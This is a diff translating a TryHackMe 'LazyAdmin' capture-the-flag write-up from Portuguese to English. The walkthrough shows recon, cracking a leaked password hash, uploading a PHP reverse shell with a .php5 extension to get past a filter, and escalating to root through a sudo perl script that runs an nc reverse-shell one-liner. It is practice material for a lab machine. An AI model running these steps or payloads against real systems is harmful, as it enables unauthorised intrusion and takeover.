@@ -1,37 +1,28 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
+# [LazyAdmin](https://tryhackme.com/room/lazyadmi)
 
-# [LazyAdmin](https://tryhackme.com/room/lazyadmin)
-
-<a href="https://tryhackme.com/room/lazyadmin"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
+<a href="https://tryhackme.com/room/lazyadmi"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > Easy linux machine to practice your skills
 
-Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/lazyadmin), feito por [MrSeth6797](https://tryhackme.com/p/MrSeth6797).
+Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/lazyadmi), made by [MrSeth6797](https://tryhackme.com/p/MrSeth6797).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/04/25`
+Solved in: `2026/04/25`
 
-# Conteúdos
+# Table of Contents
 
-- [LazyAdmin](#lazyadmin)
-- [Conteúdos](#conteúdos)
-- [Writeup](#writeup)
-   * [Sumário](#sumário)
-   * [Reconhecimento](#reconhecimento)
-   * [Exploração](#exploração)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
+...
 
 # Writeup
 
-## Sumário
+## Summary
 
-Usando vulnerabilidades no servidor `sweetrice`, a máquina é quebrada.
+Using vulnarabilities in the `sweetrice` server, the machine is broken.
 
-## Reconhecimento
+## Reconnaissance
 
-Após a abertura da máquina, adicionei seu IP ao arquivo `/etc/hosts` a fim de facilitar o acesso, com o sinônimo `la.net`. Para verificar que tudo está funcionando:
+After opening the machine, I added its IP to the `/etc/hosts` file so I'd have an easier access to it, with the alias `la.net`. To verify everything's alright:
 
 ```bash
 $ ping -c 3 la.net
@@ -45,7 +36,7 @@ PING la.net (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 139.544/141.077/143.546/1.762 ms
 ```
 
-Com isso, iniciei realizando um simples mapeamento de portas com `nmap`[^nmap] para descobrir o que estava atualmente aberto:
+With that, I went on to do a `nmap`[^nmap] scan:
 
 ```bash
 $ nmap -T4 la.net
@@ -58,11 +49,11 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Apenas um `ssh` e `http`. Sem muitas opções de entrada no `ssh` (afinal não possuo usuário ou senha) decidi ver o que o `http` tinha a oferecer:
+Just an `ssh` and an `http`. Without much to do with the `ssh` (after all I don't have an user nor a password) I decided to see what the `http` had to offer:
 
 <figure><img src="./assets/lanet_1.png" title="la.net landing page"></figure>
 
-Bem, é apenas a página padrão de um servidor Apache2. Sem nada mais no site em si, recorri ao `gobuster`[^gobuster] para verificar a existência de outros diretórios (com uma das wordlists padrões do kali[^wl-dirl23med]):
+It's just the default landing page of an Apache2 server. Without much else, I recurred to `gobuster`[^gobuster] (using one of the available kali linux wordlists[^wl-dirl23med]) to see if there were any other directories:
 
 ```bash
 $ gobuster dir -u la.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -74,15 +65,15 @@ Starting gobuster in directory enumeration mode
 /content              (Status: 301) [Size: 302] [--> http://la.net/content/]
 ```
 
-Existe outra página! Verificando `/content`...
+There is another! Verifying `/content`...
 
 <figure><img src="./assets/lanet_2.png" title="la.net/content"></figure>
 
-Também outra página padrão, desta vez para o serviço `sweetrice`. 
+Also another default landing page, this time for `sweetrice`.
 
-## Exploração
+## Exploration
 
-Ainda sem nenhuma informação, decidi buscar por vulnerabilidades no `sweetrice` usando `searchsploit`:[^srchspl]
+Still yet with no info, I decided to go for exploits within `sweetrice` using `searchsploit`[^srchspl] to find 'em:
 
 ```bash
 $ searchsploit sweetrice
@@ -101,7 +92,7 @@ SweetRice < 0.6.4 - 'FCKeditor' Arbitrary  | php/webapps/14184.txt
 Shellcodes: No Results
 ```
 
-Os exploits *Backup Disclosure* (40718), *Arbitrary File Upload* (40716) e *Arbitrary File Download* (40698) parecem todos promissores para obter mais informações. Dito isso, decidir testar o 40718 primeiro já que poderia fornecer informações de acesso para o sistema `sweetrice`.
+The exploits *Backup Disclosure* (40718), *Arbitrary File Upload* (40716) and *Arbitrary File Download* (40698) all seem very good to use. I decided to go with 40718 first as it could lend me access to the credentials for the system.
 
 ```bash
 $ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt 
@@ -125,12 +116,12 @@ and can access to website files backup from:
 http://localhost/SweetRice-transfer.zip  
 ```
 
-Bem simples! Podemos ver arquivos diretamente se os diretórios não foram devidamente configurados (eu me pergunto se um "Lazy Admin" iria configurá-los...). Entrando em `la.net/content/inc`:
+Very simple! We can directly access backup files if the directories weren't properly set (and I ask myself if a "Lazy Admin" would have set them...). Entering `la.net/content/inc`:
 
 <figure><img src="./assets/lanet_3.png" title="la.net/content/inc"></figure>
 <figure><img src="./assets/lanet_4.png" title="Exposed db backup"></figure>
 
-Realmente, o backup da database estava completamente exposto! Após baixar o arquivo e bisbilhotar dentro dele, encontrei a seguinte linha:
+It is as so, the database backup was completely exposed! After downloading the file and looking through it, I found the following line:
 
 ```
 ...
@@ -138,7 +129,7 @@ Realmente, o backup da database estava completamente exposto! Após baixar o arq
 ...
 ```
 
-Que pode ser traduzida para:
+That can be translated to this entry:
 
 - name: Lazy Admin's Website
 - author: Lazy Admin
@@ -149,7 +140,7 @@ Que pode ser traduzida para:
 - passwd: 42f749ade7f9e195bf475f37a44cafcb
 - close: close_tip
 
-Ótimo, adquiri um usuário (`manager`) e uma senha (`42f749ade7f9e195bf475f37a44cafcb`). Dito isso, a senha está em formato hash, então precisei primeiramente encontrar o texto pleno. Com `hashid`[^hashid] verifiquei o formato:
+Great, I found an user (`manager`) and a password (`42f749ade7f9e195bf475f37a44cafcb`). That said, the password is currently encrypted, so I first need to find its plain text. With `hashid`[^hashid] I verified the format:
 
 ```bash
 $ hashid 42f749ade7f9e195bf475f37a44cafcb                               
@@ -161,7 +152,7 @@ Analyzing '42f749ade7f9e195bf475f37a44cafcb'
 ...
 ```
 
-E com `hashcat`[^hashcat], usando a lista de senhas `rockyou`[^rockyou], um ataque de força bruta rapidamente encontra uma senha:
+Then `hashcat`[^hashcat], using the `rockyou`[^rockyou] passlist, bruteforces a password out:
 
 ```bash
 $ hashcat -a 0 -m 0 '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt.gz
@@ -177,7 +168,7 @@ Started: Sat Apr 25 17:28:00 2026
 Stopped: Sat Apr 25 17:28:23 2026
 ```
 
-A senha é, então, <FLAG0>. Agora, só falta um painel de acesso! Usei novamente o `gobuster`[^gobuster] para encontrar diretórios, desta vez dentro do `sweetrice` (`la.net/content`):
+The password is, then, <FLAG0>. Now I only need an access panel! Once more I used `gobuster`[^gobuster] to find directories, this time within `sweetrice` (`la.net/content`):
 
 ```bash
 $ gobuster dir -u la.net/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -196,44 +187,44 @@ Starting gobuster in directory enumeration mode
 /attachment           (Status: 301) [Size: 313] [--> http://la.net/content/attachment/]
 ```
 
-Além do `/inc` que utilizei mais cedo, o outro diretório relevante da lista é `/as`, que revela um painel de acesso de administrador:
+Besides `/inc` that I just used, the other relevant one here is `/as` that reveals an access panel:
 
 <figure><img src="./assets/lanet_5.png" title="la.net/content/as"></figure>
 
-Que, com o usuário e senha previamente adquiridos, permitem entrada no painel de administração do website por completo:
+That, with user and password properly given, lands into an admin page:
 
 <figure><img src="./assets/lanet_6.png" title="Admin panel"></figure>
 
-Com tantas abas, demorou um pouco para encontrar um ponto de acesso, mas finalmente, no `Media Center` é possível realizar upload de arquivos arbitrariamente!
+So many tabs, so much to search! After a while I found the `Media Center` that allowed file uploading:
 
 <figure><img src="./assets/lanet_7.png" title="Media center"></figure>
 
-A melhor parte, que descobri após enviar um arquivo ao servidor, foi que os arquivos permanecem clicáveis e, então, facilmente executáveis:
+And, the best part, I found that after sending the file it becomes clickable and, thus, executable:
 
 <figure><img src="./assets/lanet_8.png" title="Clickable files"></figure>
 
-Com isso, decidi usar um dos reverse shells[^rv] disponíveis em [revshells.com](https://revshells.com) para obter um terminal na máquina. Bem, como o servidor possui `PHP` instalado, decidi usar o *PHP PentestMonkey* para realizar o trabalho.
+So, I made a reverse shell[^rv] here with one of the many available at [revshells.com](https://revshells.com). Since the server has `PHP` I decided to go with *PHP PentestMonkey*.
 
-Apenas realizar o upload do arquivo não foi suficiente, uma vez que o upload da extensão `.php` estava bloqueado. Mas a extensão `.php5` não foi bloquada:
+Though uploading the file wasn't enough, as `.php` was being blocked. `.php5` wasn't, however:
 
 <figure><img src="./assets/lanet_9.png" title=".php5"></figure>
 
-Então coloquei o `netcat`[^nc] para ouvir dentro das configurações do revshell:
+So with `netcat`[^nc] listening on my end:
 
 ```bash
 $ nc -lvnp 1234
 ```
 
-E, quando cliquei no arquivo, o servidor executou o revshell!
+I clicked the revshell, and sure enough, I had gotten one!
 
 ```bash
 $ whoami
 www-data
 ```
 
-## Escalação de Privilégios
+## Privilege Escalation
 
-Uma bisbilhotada simples pelos arquivos revelou-me a bandeira de usuário:
+A simple look around revealed me the user flag:
 
 ```bash
 $ pwd
@@ -242,7 +233,7 @@ $ cat user.txt
 <FLAG_USER>
 ```
 
-`python`[^py] estava instalado na máquina, rapidamente elevei o terminal:
+`python`[^py] was on the machine, so I quickly elevated the terminal:
 
 ```bash
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -250,7 +241,7 @@ www-data@THM-Chal:/$ whoami
 www-data
 ```
 
-E, em seguida, verifiquei as permissões do sistema em relação ao `sudo`:
+Following suit, I verified the `sudo` permissions:
 
 ```bash
 www-data@THM-Chal:/$ sudo -l
@@ -263,14 +254,14 @@ User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
 
-Temos duas coisas disponíveis para serem executadas: o `perl`[^perl] e um script `.pl` (a extensão padrão para `perl`). De instinto, eu tentei executar um comando de elevação no `perl` (providenciado em [GTFObins](https://gtfobins.org/)) mas, infelizmente, não foi tão simples:
+I have two no-password things at my disposal: `perl`[^perl] and a `.pl` script which is the default `perl` extension. From instinct I tried executing a [GTFObin](https://gtfobins.org/) but it wasn't all that simple:
 
 ```bash
 www-data@THM-Chal:/$ sudo perl -e 'exec "/bin/sh"'
 [sudo] password for www-data:
 ```
 
-Então segui para a próxima opção, verificar o script providenciado.
+So I went on to the next option, verifying the given script:
 
 ```bash
 www-data@THM-Chal:/$ cat /home/itguy/backup.pl
@@ -280,7 +271,7 @@ cat /home/itguy/backup.pl
 system("sh", "/etc/copy.sh");
 ```
 
-Bem, o script em si apenas executa com `perl` uma linha. Ele invoca um console e executa outro script, `/etc/copy.sh`. Huh! Então ei de ver o que temos em `/etc/copy.sh`:
+Well, it just executes one line with `perl`. It invokes a shell then executes `/etc/copy.sh`. Huh! So I went on to this other file:
 
 ```bash
 www-data@THM-Chal:/etc$ ls -l copy.sh
@@ -292,7 +283,7 @@ cat copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
 
-Literalmente um reverse shell[^rv], e como tal é executado pelo `perl`, eu consigo escalar os privilégios desta forma! Antes disso, tenho que alterar o script para receber meu IP:
+It is a reverse shell[^rv]! And since such is executed with `perl`, I can escalate privileges that way! So I first change the IP to that of my machine:
 
 ```bash
 www-data@THM-Chal:/etc$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_MACHINE>
@@ -303,19 +294,19 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_MACHINE>
 ot shown 5554 >/tmp/f
 ```
 
-Abrir o `netcat`[^nc] na porta `5554` na minha máquina:
+Open up `netcat`[^nc] on the `5554` port, on my machine:
 
 ```bash
 $ nc -lvnp 5554
 ```
 
-E então rodar o `perl` para executar o script `/home/itguy/backup.pl` com privilégios de `sudo`:
+And simply execute `perl` with `sudo` permissions:
 
 ```bash
 www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 
-Com isso, consegui outro reverse shell, agora escalado com privilégios de root:
+That way, I got another revshell, a sudo one!
 
 ```bash
 $ nc -lvnp 5554
@@ -326,7 +317,7 @@ ot shown] from (UNKNOWN) [<MACHINE_IP>] 55744
 root
 ```
 
-Agora, basta adquirir a bandeira de root:
+Last on the list is getting the root flag:
 
 ```bash
 # pwd
